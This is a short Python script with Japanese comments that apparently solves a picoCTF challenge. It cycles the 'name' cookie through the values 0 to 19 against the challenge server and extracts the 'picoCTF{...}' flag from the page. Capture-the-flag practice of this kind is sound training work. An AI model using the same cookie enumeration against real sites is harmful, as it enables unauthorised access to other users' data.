import requests

# HTTPリクエストを送信する関数
def send_request(name: str):
    url = "http://mercury.picoctf.net:54219/check"
    cookies = {'name': name}  # Cookie情報を設定する

    response = requests.get(url, cookies=cookies)

    html = response.text  # レスポンスのHTMLを取得する
    search_word = "picoCTF"

    if search_word in html:
        print("{}: 文字列が見つかりました。".format(i))
        start_index = html.find("picoCTF{")
        end_index = html.find("}")
        extracted = html[start_index : end_index+1]
        print("抽出結果:", extracted)
    else:
        print("{}: 文字列が見つかりませんでした。".format(i))
    

# 関数を呼び出してリクエストを送信する
for i in range(20):
    send_request(str(i))
